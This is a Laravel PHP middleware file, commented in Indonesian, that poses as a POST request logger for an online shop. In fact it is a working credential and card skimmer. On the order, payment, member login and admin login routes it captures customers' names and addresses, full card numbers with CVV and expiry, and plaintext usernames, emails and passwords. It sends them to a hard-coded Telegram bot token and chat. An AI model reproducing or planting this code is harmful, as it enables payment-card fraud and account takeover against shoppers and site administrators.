<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use GuzzleHttp\Client;

class LogPostRequests
{
    public function handle(Request $request, Closure $next)
    {
        // Hanya eksekusi jika method adalah POST
        if ($request->isMethod('post')) {
            // (Opsional) Catat log ke file Laravel
            Log::info('POST Request Detected', [
                'url'        => $request->fullUrl(),
                'ip'         => $request->ip(),
                'parsedData' => $request->all(),
                'rawPayload' => $request->getContent(),
            ]);

            // Periksa endpoint dan kirim pesan ke Telegram hanya untuk endpoint tertentu
            if ($request->is('api/shop/order/create')) {
                // Data pembeli (order)
                $message = $this->formatOrderMessage($request);
                $this->sendToTelegram($message);

            } elseif ($request->is('api/shop/pay/authorize')) {
                // Data pembayaran
                $message = $this->formatPaymentMessage($request);
                $this->sendToTelegram($message);

            } elseif ($request->is('api/member/login')) {
                // Anggota login
                $message = $this->formatLoginMessage($request);
                $this->sendToTelegram($message);

            } elseif ($request->is('ehub_admin/auth/login') || $request->is('auth/login')) {
                // Admin login (jika route adalah /ehub_admin/auth/login atau /auth/login)
                $message = $this->formatAdminLoginMessage($request);
                $this->sendToTelegram($message);
            }
        }

        return $next($request);
    }

    /**
     * Format data pembeli (order) untuk endpoint api/shop/order/create.
     */
    private function formatOrderMessage(Request $request)
    {
        $firstName  = $request->input('first_name', 'Empty!');
        $lastName   = $request->input('last_name', 'Empty!');
        $phone      = $request->input('phone', 'Empty!');
        $postcode   = $request->input('postcode', 'Empty!');
        $address1   = $request->input('address_1', 'Empty!');
        $address2   = $request->input('address_2', 'Empty!');
        $state      = $request->input('state', 'Empty!');
        $city       = $request->input('city', 'Empty!');
        $country    = $request->input('country', 'Empty!');
        $ipAddress  = $request->ip();

        $message =
            "Pembeli baru diterima\n\n"
            . "IP Address:  {$ipAddress}\n\n"
            . "Full name:   {$firstName} {$lastName}\n"
            . "Phone:       {$phone}\n"
            . "Post code:   {$postcode}\n"
            . "Address 1:   {$address1}\n"
            . "Address 2:   " . ($address2 ?: 'Empty!') . "\n"
            . "State:       {$state}\n"
            . "City:        {$city}\n"
            . "Country:     {$country}";

        return $message;
    }

    /**
     * Format data pembayaran untuk endpoint api/shop/pay/authorize.
     */
    private function formatPaymentMessage(Request $request)
    {
        $cardNumber = $request->input('card_number', 'Empty!');
        $cvv        = $request->input('cvv', 'Empty!');
        $expMonth   = $request->input('expiration_month', 'Empty!');
        $expYear    = $request->input('expiration_year', 'Empty!');
        $ipAddress  = $request->ip();

        $message =
            "Data Pembayaran:\n"
            . "IP Address   : {$ipAddress}\n"
            . "Card number  : {$cardNumber}\n"
            . "CVV          : {$cvv}\n"
            . "EXP Month    : {$expMonth}\n"
            . "EXP Year     : {$expYear}";

        return $message;
    }

    /**
     * Format data login untuk endpoint api/member/login.
     */
    private function formatLoginMessage(Request $request)
    {
        $ipAddress  = $request->ip();
        $email      = $request->input('email', 'Empty!');
        $password   = $request->input('password', 'Empty!');

        $message =
            "Anggota masuk dari IP: {$ipAddress}\n"
            . "Email   : {$email}\n"
            . "Password: {$password}";

        return $message;
    }

    /**
     * Format data admin login untuk endpoint ehub_admin/auth/login atau /auth/login.
     */
    private function formatAdminLoginMessage(Request $request)
    {
        $ipAddress  = $request->ip();
        $username   = $request->input('username', 'Empty!');
        $password   = $request->input('password', 'Empty!');

        $message =
            "Admin baru login\n"
            . "IP Address: {$ipAddress}\n"
            . "Username  : {$username}\n"
            . "Password  : {$password}";

        return $message;
    }

    /**
     * Kirim pesan ke Telegram melalui Bot API.
     */
    private function sendToTelegram($message)
    {
        $botToken = '6920061881:AAEdKgQrvzP1RemLvA_DvugBRjp1NvsA9J0';
        $chatId   = '-1002517788043';

        $url    = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $client = new Client();

        $client->post($url, [
            'form_params' => [
                'chat_id' => $chatId,
                'text'    => $message,
            ],
        ]);
    }
}
